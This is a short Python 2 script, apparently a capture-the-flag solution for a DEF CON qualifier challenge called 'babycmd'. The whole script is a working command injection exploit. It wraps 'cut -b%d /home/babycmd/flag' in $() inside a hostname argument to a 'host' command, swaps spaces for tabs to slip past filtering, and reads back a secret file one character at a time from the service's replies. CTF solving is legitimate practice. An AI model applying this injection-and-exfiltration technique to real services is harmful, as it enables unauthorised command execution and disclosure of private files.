import telnetlib

host = 'babycmd_3ad28b10e8ab283d7df81795075f600b.quals.shallweplayaga.me'
port = 15491

tn = telnetlib.Telnet(host,port)

ans = ""
pos = 1
print tn.read_until("exit")

while True:
  print tn.read_until(":")
  data = "cut -b%d /home/babycmd/flag" % pos
  data = data.replace(" ","\t")
  print "%r" % ('host test"$(' + data + ')".com\n')
  tn.write('host test"$(' + data + ')".coooom\n')
  q = tn.read_until("exit")
  print q
  if "couldn't get address" in q:
    ans = ans + " "
  else:
    ans = ans + q[ q.find("test")+4 ]
  pos = pos + 1
  print ans
